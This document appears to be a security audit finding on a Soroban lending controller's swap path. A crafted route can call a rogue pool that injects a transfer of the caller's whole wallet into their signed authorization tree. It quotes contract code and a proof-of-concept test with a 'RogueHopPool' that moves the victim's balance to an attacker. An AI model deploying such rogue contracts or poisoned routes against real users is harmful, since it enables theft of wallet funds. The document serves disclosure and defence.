### Title
Attacker-crafted swap route injects arbitrary `transfer` authorizations into the caller’s signed auth tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The controller treats the caller-supplied `StrategySwap` route as opaque bytes, authorizes only one exact controller-to-router input transfer, executes the configured router, and then validates only controller balance deltas, positive output, and final account risk. The route program can nevertheless name arbitrary venue/pool addresses, and code reached through those addresses can request `require_auth` for the original caller on unrelated token contracts. Soroban records that request as a child of the caller’s signed `swap_collateral`/`swap_debt` root, so a client that signs the simulated tree authorizes a wallet drain that neither the input cap nor the output check bounds. The repository’s own threat model states that the router keeps no pool/token allowlist and that such a child transfer “executes if the caller signs that tree,” with loss bounded by the caller’s wallet rather than the routed amount. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_collateral` authenticates the caller and forwards the user-controlled `swap` payload into the withdraw-and-swap path without parsing or constraining the venue addresses encoded inside it. `swap_debt` does the same for newly borrowed funds routed through `swap_tokens_or_passthrough`. [4](#0-3) [5](#0-4)  The common swap helper creates exactly one authorization: a current-contract token `transfer` of `amount_in` to the router, then calls `router.execute_strategy(&controller, &amount_in, swap)` under the flash guard. [6](#0-5)  Afterward it rejects only controller-level overspending and non-positive output; it never inspects nested authorization requests made by code the route reached. [7](#0-6)  In the router program shape, a swap hop resolves `pool`, `token_in`, and `token_out` from caller-supplied `assets` indexes and dispatches to that named pool, so arbitrary contract code can run inside the strategy call. [2](#0-1)  The focused test double shows a malicious hop calling `token.transfer(alice, attacker, WALLET_BALANCE)`, simulation recording that transfer as a child of Alice’s `swap_collateral` invocation, and enforcing mode succeeding only when the signed tree contains that injected child. [8](#0-7) [9](#0-8) 

### Impact Explanation
A poisoned route can steal assets that are entirely outside the lending market and outside the declared swap input, because the injected token `transfer` is evaluated as part of the victim caller’s authorization tree rather than as a bounded protocol spend. The demonstrated loss is the victim’s full unrelated wallet-token balance while the protocol-level swap still returns fair output and passes risk checks, so on-chain protections remain green. This is theft of user funds, not merely bad execution price: the controller’s `actual_spent <= amount_in` and `received > 0` checks cover only the controller’s token balances and do not include the attacker-chosen child transfer. [7](#0-6) [10](#0-9) [11](#0-10) 

### Likelihood Explanation
Execution requires the victim to sign the exact authorization tree returned by simulation, including the injected child transfer; an attacker cannot force that signature solely by submitting a transaction. The realistic path is a route/client flow where the user requests or accepts a crafted `StrategySwap`, simulation records the extra `transfer`, and wallet UX does not make the added child conspicuous before signing. The protocol-side exposure is still structural: the controller accepts opaque route bytes for permissionless strategy entrypoints, relies on a single current-contract transfer authorization, and performs post-checks that cannot see or bound nested caller-authed transfers. [1](#0-0) [3](#0-2) [12](#0-11) 

### Recommendation
Do not treat route bytes as a trusted authorization-neutral payload. Enforce an allowlist of venue/pool/token addresses for controller-mediated swaps, or decode the `StrategySwap` in the controller and reject any program whose referenced assets are not the declared `token_in`, `token_out`, and approved venues. Add a post-route assertion that no authorization invocation for the original caller other than the expected root was requested, and surface that invariant to clients so signed trees with extra `transfer` children are refused before submission. Document and test that controller-initiated swaps must produce exactly the controller’s single input transfer child and no caller-child token movements. [1](#0-0) [13](#0-12) [14](#0-13) 

### Proof of Concept
The harness registers an `UnlistedPoolRouter` whose `execute_strategy` decodes a caller-supplied `RoutedSwap`, pulls the input, invokes the payload-named `hop_pool`, and returns `min_out`; a `RogueHopPool` configured with `(victim, wallet_token, attacker, amount)` then calls `token.transfer(victim, attacker, amount)`. In recording mode, `try_swap_collateral` succeeds and `env.auths()` equals one root `swap_collateral` invocation for Alice containing a child `transfer(alice, attacker, WALLET_BALANCE)` on the unrelated wallet token. In enforcing mode, signing the honest root-only tree makes the rogue transfer fail with host auth/context error and rolls back the swap, while signing the simulated tree containing the stolen transfer completes and moves `WALLET_BALANCE` from Alice to the attacker. [15](#0-14) [8](#0-7) [16](#0-15)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-54)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-166)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-71)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L230-269)
```rust
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
